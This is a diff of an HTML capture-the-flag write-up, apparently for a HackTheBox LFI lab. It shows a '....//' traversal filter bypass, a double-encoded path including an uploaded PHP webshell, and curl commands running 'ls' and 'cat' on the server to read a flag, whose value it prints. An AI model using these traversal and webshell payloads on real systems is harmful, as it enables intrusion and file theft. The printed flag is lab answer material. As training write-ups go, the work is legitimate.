@@ -52,13 +52,15 @@
 <p>I tried to use the <strong>p</strong> parameter to load a different file, but found it seemed to be blocking any string that contained a <strong>../</strong>, so I decided to try using <strong>..//</strong> to see if it was only instances of ../, which would change ....// into ../</p>
 <p>Fortunately, that was the case! At this point I did get hung up for quite some time because I didn't realize that the browser would not render the response properly, because it is supposed to be an image file. At some point I tried it as a curl command and found that it was spitting out file contents.</p>
 <p>I realized I could load the contents of any PHP file, like so:</p>
-<p><code>curl 'http://83.136.253.144:53872/api/image.php?p=....//api/application.php'</code></p>
+<pre><code>curl 'http://83.136.253.144:53872/api/image.php?p=....//api/application.php'
+</code></pre>
 <p>This was very helpful, as it let me view how the file upload worked:</p>
 <p><img alt="" src="/assets/img/HTB-LFI-004.png" /></p>
 <p>By reading through this code, I could see that the file was being renamed to the MD5 hash of the file itself. That means that the file I uploaded should be at <strong>/uploads/{md5hash}.php </strong>.</p>
 <p>I used the <strong>md5sum</strong> command to get the hash of my shell file:</p>
-<p><code>$ md5sum shell.php
-fc023fcacb27a7ad72d605c4e300b389  shell.php</code></p>
+<pre><code>$ md5sum shell.php
+fc023fcacb27a7ad72d605c4e300b389  shell.php
+</code></pre>
 <h2>RCE with shell.php</h2>
 <p>At this point I knew I could probably load my shell via the <strong>region</strong> parameter on the contact page. By running a curl command using the </p>
 <p><img alt="" src="/assets/img/HTB-LFI-005.png" /></p>
@@ -70,19 +72,21 @@ fc023fcacb27a7ad72d605c4e300b389  shell.php</code></p>
 </blockquote>
 <h2>Getting the flag!</h2>
 <p>I was then able to use this shell to <strong>ls</strong> the <strong>/</strong> directory:</p>
-<p><code>curl 'http://83.136.249.34:32864/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&amp;cmd=ls+/'
+<pre><code>curl 'http://83.136.249.34:32864/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&amp;cmd=ls+/'
 boot
 dev
 etc
 flag_09ebca.txt
 home
 lib
-...</code></p>
+...
+</code></pre>
 <p>And then cat the <strong>flag_093bca.txt</strong> file:</p>
-<p><code>curl 'http://83.136.249.34:32864/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&amp;cmd=cat+/flag_09ebca.txt'
+<pre><code>curl 'http://83.136.249.34:32864/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&amp;cmd=cat+/flag_09ebca.txt'
 ...
 eedbb78d4800aa45573840ed6bd2d1e3
-...</code></p>
+...
+</code></pre>
 <h2>Lessons Learned</h2>
 <ol>
 <li>Don't make assumptions about if something, deciding that it's not vulnerable. Assume everything is vulnerable, then try to hack it.</li>
